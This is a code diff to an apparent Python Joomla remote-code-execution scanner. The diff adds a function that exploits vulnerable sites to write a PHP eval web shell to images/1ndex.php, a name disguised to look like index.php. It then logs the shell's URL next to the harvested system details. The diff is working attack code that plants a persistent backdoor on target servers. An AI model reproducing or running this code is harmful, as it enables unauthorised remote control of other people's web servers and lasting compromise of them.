@@ -411,7 +411,8 @@ def checkJoomlaRCE(url):
             system = getInfoByJoomlaRCE(result, 'System')
             document_root = getInfoByJoomlaRCE(result, 'DOCUMENT_ROOT')
             script_filename = getInfoByJoomlaRCE(result, 'SCRIPT_FILENAME')
-            vuls='[+] vuls found! url: '+url+', System: '+system+', DOCUMENT_ROOT: '+document_root+', SCRIPT_FILENAME: '+script_filename
+            shell_file = getShellByJoomlaRCE(url, system, script_filename)
+            vuls='[+] vuls found! url: '+url+', System: '+system+', document_root: '+document_root+', script_filename: '+script_filename+', shell_file: '+shell_file
             logfile(vuls,'joomla_rce.txt')
             print vuls
         else:
@@ -459,6 +460,23 @@ def getInfoByJoomlaRCE(result, param):
     else:
         info = 'no info!'
     return info
+
+def getShellByJoomlaRCE(url, system, script_filename):
+    if 'no info' not in script_filename and 'no info' not in system:
+        if 'Windows' in system:
+            shell = script_filename.split('index.php')[0].replace('/','//').strip()+"images//1ndex.php"
+        else:
+            shell = script_filename.split('index.php')[0]+"images/1ndex.php"
+        yijuhua = "<?php eval($_POST[1]);?>"
+        cmd ="file_put_contents('"+shell+"','"+yijuhua+"');"
+        pl = generate_payload(cmd)
+        try:
+            get_url(url, pl)
+            return url+"images/1ndex.php"
+        except Exception, e:
+            return "no info!"
+    else:
+        return "no info!"
     
 def myhelp():
     print "\n+-----------------------------+"
